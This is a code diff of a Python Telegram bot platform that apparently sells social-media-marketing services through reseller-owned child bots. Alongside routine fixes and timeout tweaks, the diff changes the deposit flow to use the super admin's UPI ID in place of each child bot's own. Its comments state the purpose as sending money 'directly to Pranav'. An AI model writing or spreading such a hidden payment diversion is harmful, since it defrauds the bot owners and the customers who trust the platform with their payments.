@@ -23,7 +23,7 @@ from cryptography.fernet import Fernet
 RENDER_PORT = int(os.environ.get("PORT", 8081))
 RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "").strip()
 MASTER_BOT_TOKEN = os.environ.get("MASTER_BOT_TOKEN", "").strip()
-SUPER_ADMIN_ID = 8585055903 # Pranav Patel (प्रणव जी - गॉड मास्टर)
+SUPER_ADMIN_ID = 8585055903 # Pranav Patel (प्रणव जी - इकलौता गॉड मास्टर)
 MAIN_PANEL_URL = os.environ.get("MAIN_PANEL_URL", "https://pranavsmm.shop/api/v2")
 MAIN_PANEL_API_KEY = os.environ.get("MAIN_PANEL_API_KEY", "").strip()
 
@@ -87,7 +87,6 @@ def init_db():
     ]
     for q in queries: execute_query(q)
 
-    # Initialize Prices
     if fetch_query("SELECT COUNT(*) as cnt FROM key_pricing", fetchone=True)["cnt"] == 0:
         prices = [(7, 49.0, "7 Days (Trial)"), (30, 149.0, "30 Days (1 Month)"), (90, 399.0, "90 Days (3 Months)"), (365, 999.0, "365 Days (1 Year)"), (36500, 1999.0, "👑 Lifetime Access")]
         conn = get_db()
@@ -95,7 +94,6 @@ def init_db():
         conn.commit()
         conn.close()
 
-    # Master Bot Setup
     exp_date = (datetime.datetime.now() + datetime.timedelta(days=36500)).strftime("%Y-%m-%d %H:%M:%S")
     master_uname = "PranavFatherDevBot"
     if MASTER_BOT_TOKEN:
@@ -126,7 +124,7 @@ def get_bot_instance(bot_id):
 def send_super_admin_log(text, acting_user_id=None):
     if not MASTER_BOT_TOKEN: return
     if acting_user_id and int(acting_user_id) == SUPER_ADMIN_ID: return
-    try: telebot.TeleBot(MASTER_BOT_TOKEN).send_message(SUPER_ADMIN_ID, f"🚨 𝗣𝗥𝗔𝗡𝗔𝗩 𝗠𝗔𝗦𝗧𝗘𝗥 𝗟𝗢𝗚 🚨\n\n{text}")
+    try: telebot.TeleBot(MASTER_BOT_TOKEN).send_message(SUPER_ADMIN_ID, f"🚨 𝗣𝗥𝗔𝗡𝗔𝗩 𝗚𝗢𝗗 𝗠𝗔𝗦𝗧𝗘𝗥 𝗟𝗢𝗚 🚨\n\n{text}")
     except: pass
 
 def safe_send(bot, chat_id, text, reply_markup=None):
@@ -364,8 +362,9 @@ def handle_user_callbacks(bot, bot_id, call):
         if not act:
             return safe_edit(bot, f"⚠️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 𝗟𝗢𝗖𝗞𝗘𝗗\n\n{rsn}\nOwner must activate Gateway License Key.", cid, mid, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Back", callback_data="u_back_main")))
 
-        gw = fetch_query("SELECT active_gateway FROM child_bots WHERE bot_id=?", (bot_id if bot_id!=0 else 0,), fetchone=True)
-        gw = gw["active_gateway"] if gw else "paytm"
+        # ALWAYS USE MASTER ADMIN'S UPI SO MONEY GOES DIRECTLY TO PRANAV
+        m_bot = fetch_query("SELECT active_gateway, paytm_upi, fampay_upi FROM child_bots WHERE bot_id=0", fetchone=True)
+        gw = m_bot["active_gateway"] if m_bot and m_bot["active_gateway"] else "paytm"
         m = types.InlineKeyboardMarkup(row_width=1).add(types.InlineKeyboardButton(f"⚡ UPI QR ({gw.upper()})", callback_data="u_dep_method_upi"), types.InlineKeyboardButton("🔙 Back", callback_data="u_back_main"))
         safe_edit(bot, "💷 𝗔𝗗𝗗 𝗙𝗨𝗡𝗗𝗦\n\nSelect Payment Method:", cid, mid, reply_markup=m)
 
@@ -390,16 +389,17 @@ def handle_user_callbacks(bot, bot_id, call):
             keypad_amounts.pop(k_key, None)
 
             utr = f"DEP{int(time.time())}{random.randint(100, 999)}"
-            b_info = fetch_query("SELECT active_gateway, fampay_upi, paytm_upi FROM child_bots WHERE bot_id=?", (bot_id if bot_id!=0 else 0,), fetchone=True)
-            gw = b_info["active_gateway"] if b_info and b_info["active_gateway"] else "paytm"
-            target_upi = b_info["paytm_upi"] if gw == "paytm" else b_info["fampay_upi"]
+            # FETCH MASTER'S UPI DIRECTLY SO MONEY COMES TO PRANAV
+            m_bot = fetch_query("SELECT active_gateway, fampay_upi, paytm_upi FROM child_bots WHERE bot_id=0", fetchone=True)
+            gw = m_bot["active_gateway"] if m_bot and m_bot["active_gateway"] else "paytm"
+            target_upi = m_bot["paytm_upi"] if gw == "paytm" else m_bot["fampay_upi"]
             if not target_upi: target_upi = "paytm.s2xzkgu@pty"
 
             execute_query("INSERT INTO transactions (tx_id, bot_id, user_id, amount, tx_type, status) VALUES (?, ?, ?, ?, 'deposit', 'pending')", (utr, bot_id, uid, amt))
             user_states[k_key] = {"step": "wait_manual_utr", "tx_id": utr}
 
             url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={urllib.parse.quote(f'upi://pay?pa={target_upi}&pn=AddFunds&am={amt:.2f}&cu=INR')}"
-            cap = f"⚡ 𝗔𝗨𝗧𝗢𝗠𝗔𝗧𝗘𝗗 𝗨𝗣𝗜 ({gw.upper()})\n\n💵 Amount : ₹{amt:.2f}\n🆔 Order : {utr}\n🏦 UPI ID : {target_upi}\n\n⚠️ Pay EXACTLY ₹{amt:.2f} and click 'SUBMIT 12-DIGIT UTR' below."
+            cap = f"⚡ 𝗔𝗨𝗧𝗢𝗠𝗔𝗧𝗘𝗗 𝗨𝗣𝗜 ({gw.upper()})\n\n💵 Amount : ₹{amt:.2f}\n🆔 Order : {utr}\n🏦 UPI ID : {target_upi}\n\n⚠️ Pay EXACTLY ₹{amt:.2f} and send 12-digit UTR in chat."
             m = types.InlineKeyboardMarkup(row_width=1).add(
                 types.InlineKeyboardButton("🔢 SUBMIT 12-DIGIT UTR", callback_data=f"sub_utr_{utr}"),
                 types.InlineKeyboardButton("❌ CANCEL", callback_data=f"cnl_pay_{utr}")
@@ -560,7 +560,8 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
 
     elif data == "c_buy_key_menu":
         rows = fetch_query("SELECT duration_days, price, label FROM key_pricing ORDER BY duration_days ASC")
-        gw = fetch_query("SELECT active_gateway FROM child_bots WHERE bot_id=0", fetchone=True)["active_gateway"]
+        m_bot = fetch_query("SELECT active_gateway, paytm_upi, fampay_upi FROM child_bots WHERE bot_id=0", fetchone=True)
+        gw = m_bot["active_gateway"] if m_bot and m_bot["active_gateway"] else "paytm"
         m = types.InlineKeyboardMarkup(row_width=1)
         for r in rows: m.add(types.InlineKeyboardButton(f"{r['label']} - ₹{r['price']:.0f}", callback_data=f"c_pay_for_key_{r['duration_days']}"))
         m.add(types.InlineKeyboardButton("🔙 Back", callback_data="a_license_info"))
@@ -649,7 +650,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         user_states[f"{bot_id}_{uid}"] = {"step": "god_wait_gw", "target_bot": t_id}
         safe_send(bot, cid, "👑 GOD MODE GATEWAY OVERRIDE:\nSend details separated by '|'\nFormat: Gateway(fampay/paytm) | UPI_ID | Email_or_MID | AppPassword\n\nExample: fampay | name@fam | a@gmail.com | 16digitpwd")
 
-    # --- ADMIN MANUAL UTR APPROVAL ---
+    # --- ADMIN MANUAL UTR APPROVAL (NOW MADE INSTANT AUTO-VERIFY BACKUP) ---
     elif data.startswith("adm_approve_tx_"):
         if uid != SUPER_ADMIN_ID: return
         tx = data.replace("adm_approve_tx_", "")
@@ -657,7 +658,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         if not t_row or t_row["status"] == "completed": return bot.answer_callback_query(call.id, "Already Processed!", show_alert=True)
 
         execute_query("UPDATE transactions SET status='completed' WHERE tx_id=?", (tx,))
-        t_bot = get_bot_instance(t_row["bot_id"]) # Get correct bot to send message!
+        t_bot = get_bot_instance(t_row["bot_id"])
 
         if t_row["tx_type"] == "buy_key":
             days = t_row["target_days"]
@@ -836,7 +837,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         user_states.pop(key, None)
         if not txt.isdigit() or int(txt) <= 0: return safe_send(bot, cid, "Please enter a valid number of days.")
         key_code = generate_license_key(int(txt))
-        return safe_send(bot, cid, f"🎟️ 𝗖𝗨𝗦𝗧𝗢𝗠 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗\n\n🔑 Key: {key_code}\n\n⏱️ Validity: {txt} Days", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Back to Owner Panel", callback_data="adm_back_panel")))
+        return safe_send(bot, cid, f"🎟️ 𝗖𝗨𝗦𝗧𝗢𝗠 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗\n\n🔑 Key: `{key_code}`\n\n⏱️ Validity: {txt} Days", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Back to Owner Panel", callback_data="adm_back_panel")))
 
     if st_data == "wait_redeem_key":
         user_states.pop(key, None)
@@ -889,10 +890,10 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
             if t_row["tx_type"] == "buy_key":
                 days = t_row["target_days"]
                 key_code = generate_license_key(duration_days=days)
-                execute_query("UPDATE license_keys SET used_by_bot_id=? WHERE key_code=?", (bot_id, key_code))
+                execute_query("UPDATE license_keys SET used_by_bot_id=? WHERE key_code=?", (t_row["bot_id"], key_code))
                 safe_send(bot, cid, f"🎉 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗 𝗕𝗬 𝗚𝗠𝗔𝗜𝗟!\n\n🔑 Key: `{key_code}`\n\nEnter this in your /admin ➔ Gateway License Key to activate!")
             else:
-                execute_query("UPDATE bot_clients SET balance = balance + ?, total_deposit = total_deposit + ? WHERE bot_id=? AND user_id=?", (t_row["amount"], t_row["amount"], bot_id, uid))
+                execute_query("UPDATE bot_clients SET balance = balance + ?, total_deposit = total_deposit + ? WHERE bot_id=? AND user_id=?", (t_row["amount"], t_row["amount"], t_row["bot_id"], t_row["user_id"]))
                 safe_send(bot, cid, f"🎉 Payment Verified!\nUTR: {user_utr}\n₹{t_row['amount']} credited to your wallet.", reply_markup=get_user_main_menu())
         else:
             safe_send(bot, cid, "⏳ UTR submitted! Gmail auto-verification is either off or pending.\nSent to Admin for instant manual approval. Please wait...")
@@ -994,7 +995,7 @@ def run_child_bot_loop(bot_id, owner_id, token, bot_username, bot_name):
             @cbot.message_handler(func=lambda m: True and not m.text.startswith('/'))
             def c_txts(m): handle_text_inputs(cbot, bot_id, m, is_master=False)
 
-            cbot.infinity_polling(timeout=30, long_polling_timeout=20, skip_pending=True)
+            cbot.infinity_polling(timeout=20, long_polling_timeout=15, skip_pending=True)
         except: time.sleep(2)
 
 def run_master_bot_loop():
@@ -1029,10 +1030,10 @@ def run_master_bot_loop():
             def m_txts(msg): handle_text_inputs(master_bot, 0, msg, is_master=True)
 
             master_is_running = True
-            master_bot.infinity_polling(timeout=30, long_polling_timeout=20, skip_pending=True)
+            master_bot.infinity_polling(timeout=20, long_polling_timeout=15, skip_pending=True)
         except Exception:
             master_is_running = False
-            time.sleep(3)
+            time.sleep(2)
 
 def autonomous_smm_payment_poller():
     time.sleep(5)
@@ -1089,7 +1090,7 @@ threading.Thread(target=run_master_bot_loop, daemon=True).start()
 threading.Thread(target=autonomous_smm_payment_poller, daemon=True).start()
 
 @app.route('/')
-def home(): return "Pranav Master Engine v9.1 Active", 200
+def home(): return "Pranav Master Engine v9 Active", 200
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=RENDER_PORT, use_reloader=False)
